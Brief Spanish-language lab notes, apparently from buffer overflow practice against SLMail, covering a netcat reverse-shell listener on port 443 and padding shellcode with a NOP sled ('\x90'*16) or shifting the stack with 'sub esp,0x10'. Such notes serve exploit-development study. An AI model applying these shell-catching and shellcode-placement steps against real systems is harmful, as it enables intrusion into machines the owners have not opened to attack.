nos ponemos en escucha
```
rlwrap nc -nlcp 443
```
corremos el python
detenemos el slmail
volvemos a encender
comoel shellcode es muy largo hay que darlo espacio de descanso para que pueda ejecutarlo todo
no operation code, codigo basura de descanso
se representa como x90
otra forma es desplazando la pila
despues de la `eip + b"\x90"*16 + shellcode`
otra forma nasm_shell.rb, `sub esp,0x10` decrementamos un contador, es como una instruccion que colocamos en vez de \x90